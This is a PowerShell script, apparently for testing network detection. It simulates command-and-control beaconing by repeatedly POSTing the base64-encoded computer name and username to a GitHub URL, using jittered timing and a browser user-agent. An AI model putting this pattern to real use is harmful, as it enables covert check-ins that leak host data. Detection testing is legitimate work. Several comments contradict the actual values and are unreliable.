# --- Beacon Configuration  30 seconds---
$TargetUrl = "http://github.com/mchervony/test_TT/blob/main/README.md" # Replace with your read-only target
$BaseSleepSeconds = 5                              # Average time between beacons
$JitterPercent = 5                                 # Randomize sleep by +/- 20%
Write-Host "[*] Starting POST Beacon Simulation to $TargetUrl"
Write-Host "[*] Press Ctrl+C to stop."
while ($true) {
    # 1. Generate a fake payload (simulating system info check-in)
    $RawData = "id=$env:COMPUTERNAME&user=$env:USERNAME&tick=$([Environment]::TickCount)"
    $FakePayload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($RawData))
# 2. Calculate Jitter for this cycle
    $JitterMax = $BaseSleepSeconds * ($JitterPercent / 100)
    $RandomJitter = Get-Random -Minimum (-$JitterMax) -Maximum $JitterMax
    $NextSleep = [math]::Round($BaseSleepSeconds + $RandomJitter)
Write-Host "[*] Sending POST... (Next sleep: $NextSleep seconds)"
# 3. Execute the POST request
    try {
        # We use -UseBasicParsing to avoid IE engine dependencies in PS 5.1
        $response = Invoke-WebRequest -Uri $TargetUrl `
                                      -Method POST `
                                      -Body $FakePayload `
                                      -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" `
                                      -UseBasicParsing `
                                      -ErrorAction Stop
        Write-Host "[+] Success (HTTP 200)"
    }
    catch {
        # Because the target is read-only, it will likely throw a 405 or 403.
        # We catch it silently so the beacon loop continues.
        Write-Host "[-] Server rejected POST (Expected for read-only): $($_.Exception.Message)"
    }
# 4. Sleep until next beacon
    Start-Sleep -Seconds $NextSleep
}

# ---RANDOM Beacon Configuration ---
$TargetUrl = "http://github.com/mchervony/test_TT/blob/main/README.md" # Replace with your read-only target
$MinSleep = 5      # Minimum 20 seconds
$MaxSleep = 5     # Maximum 10 minutes (600 seconds)
Write-Host "[*] Starting randomized POST Beacon Simulation to $TargetUrl"
Write-Host "[*] Interval: $MinSleep to $MaxSleep seconds. Press Ctrl+C to stop."
while ($true) {
    # 1. Generate a fake payload (simulating system info check-in)
    $RawData = "id=$env:COMPUTERNAME&user=$env:USERNAME&tick=$([Environment]::TickCount)"
    $FakePayload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($RawData))
# 2. Calculate Random Sleep for this cycle (+1 ensures 600 is included)
    $NextSleep = Get-Random -Minimum $MinSleep -Maximum ($MaxSleep + 1)
Write-Host "[*] Sending POST... (Next sleep: $NextSleep seconds)"
# 3. Execute the POST request
    try {
        # -UseBasicParsing avoids IE engine dependencies in PS 5.1
        $response = Invoke-WebRequest -Uri $TargetUrl `
                                      -Method POST `
                                      -Body $FakePayload `
                                      -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" `
                                      -UseBasicParsing `
                                      -ErrorAction Stop
        Write-Host "[+] Success (HTTP 200)"
    }
    catch {
        # Catch 405/403 silently so the beacon loop continues
        Write-Host "[-] Server rejected POST (Expected for read-only): $($_.Exception.Message)"
    }
# 4. Sleep until next beacon
    Start-Sleep -Seconds $NextSleep
}
